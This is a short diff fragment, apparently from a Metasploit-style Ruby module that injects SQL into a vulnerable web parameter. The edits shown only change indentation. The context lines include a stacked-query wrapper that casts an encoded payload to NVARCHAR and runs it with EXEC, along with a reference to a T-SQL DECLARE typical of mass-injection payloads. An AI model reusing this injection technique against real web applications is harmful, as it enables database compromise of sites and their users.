@@ -72,7 +72,7 @@ DECLARE @T varchar(255),@C varchar(255)
 		prestr = ";DECLARE @S NVARCHAR(4000);SET @S=CAST("
 		poststr = " AS NVARCHAR(4000));EXEC(@S);"
              
-        	gvars = queryparse(datastore['QUERY']) #Now its a Hash
+        gvars = queryparse(datastore['QUERY']) #Now its a Hash
  
 		if gvars.has_key?(datastore['VULN_PAR'])
            
@@ -89,13 +89,12 @@ DECLARE @T varchar(255),@C varchar(255)
                  
 	begin
 		normalres = send_request_cgi({
-				'uri'          =>  datastore['URI'],
-				'vars_get'     =>  gvars,   
-				'method'       => 'GET',
-				'ctype'        => 'text/plain'
-				}, 20)
+			'uri'          =>  datastore['URI'],
+			'vars_get'     =>  gvars,   
+			'method'       => 'GET',
+			'ctype'        => 'text/plain'
+		}, 20)
 
-		
 	rescue ::Rex::ConnectionError
 	rescue ::Errno::EPIPE			
 	end
